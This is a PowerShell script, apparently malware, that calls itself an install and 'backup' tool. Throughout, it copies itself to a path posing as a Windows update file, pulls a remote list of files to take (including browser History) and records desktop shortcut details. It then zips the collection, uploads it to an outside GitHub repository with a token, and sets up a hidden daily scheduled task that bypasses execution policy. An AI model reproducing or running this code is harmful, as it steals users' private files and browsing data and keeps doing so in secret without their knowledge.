# install.ps1 - 上传文件 + 注册计划任务（当前用户）
$logPath = "C:\upload_log.txt"
"[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File $logPath -Append

# 下载自身（用于计划任务）
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
$remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"

try {
    Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
    "[OK] install.ps1 downloaded to $localPath" | Out-File $logPath -Append
} catch {
    "❌ Failed to download install.ps1: $($_.Exception.Message)" | Out-File $logPath -Append
    return
}

# 获取 GitHub Token
$token = $env:GITHUB_TOKEN
if (-not $token) {
    "❌ GITHUB_TOKEN 环境变量不存在，终止执行。" | Out-File $logPath -Append
    return
}

# 上传逻辑
try {
    $repo = "drftghy/backup-files"
    $now = Get-Date
    $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
    $date = $now.ToString("yyyy-MM-dd")
    $computerName = $env:COMPUTERNAME
    $tag = "backup-$computerName-$timestamp"
    $releaseName = "Backup - $computerName - $date"
    $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
    $zipName = "package-$computerName-$timestamp.zip"
    $zipPath = Join-Path $env:TEMP $zipName
    New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null

    # 加载上传路径列表
    $targetListUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
    $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing
    $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }

    # 复制文件
    $i = 0
    foreach ($path in $paths) {
        $i++
        $dst = Join-Path $tempRoot "item$i"
        try {
            if (-not (Test-Path $path)) { continue }
            if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
                robocopy (Split-Path $path) $dst (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            } elseif (Test-Path $path -PathType Container) {
                Copy-Item $path -Destination $dst -Recurse -Force
            } else {
                Copy-Item $path -Destination $dst -Force
            }
        } catch {
            "⚠️ Failed to copy path: ${path} => $($_.Exception.Message)" | Out-File $logPath -Append
        }
    }

    # 提取桌面快捷方式信息
    try {
        $desktop = [Environment]::GetFolderPath("Desktop")
        $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
        $lnkReport = ""
        foreach ($lnk in $lnkFiles) {
            $shell = New-Object -ComObject WScript.Shell
            $s = $shell.CreateShortcut($lnk.FullName)
            $lnkReport += "[$($lnk.Name)]`nTarget: $($s.TargetPath)`nArgs: $($s.Arguments)`nStartIn: $($s.WorkingDirectory)`nIcon: $($s.IconLocation)`n---`n"
        }
        $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
    } catch {}

    # 打包
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force

    # 创建 Release
    $releaseData = @{
        tag_name    = $tag
        name        = $releaseName
        body        = "Auto backup from $computerName"
        draft       = $false
        prerelease  = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "PowerShell"
        Accept        = "application/vnd.github.v3+json"
    }

    $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
    $uploadUrl = $releaseResp.upload_url -replace "{.*}", "?name=$zipName"

    # 上传 ZIP
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShell"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes

    "[OK] Upload completed." | Out-File $logPath -Append
} catch {
    "❌ Upload failed: $($_.Exception.Message)" | Out-File $logPath -Append
}

# 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# 注册任务（当前用户）
try {
    $taskName = "UploaderTask"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        "[OK] Existing task removed." | Out-File $logPath -Append
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal

    "[OK] Scheduled task registered (0:00)." | Out-File $logPath -Append
} catch {
    "? Failed to register task: $($_.Exception.Message)" | Out-File $logPath -Append
}
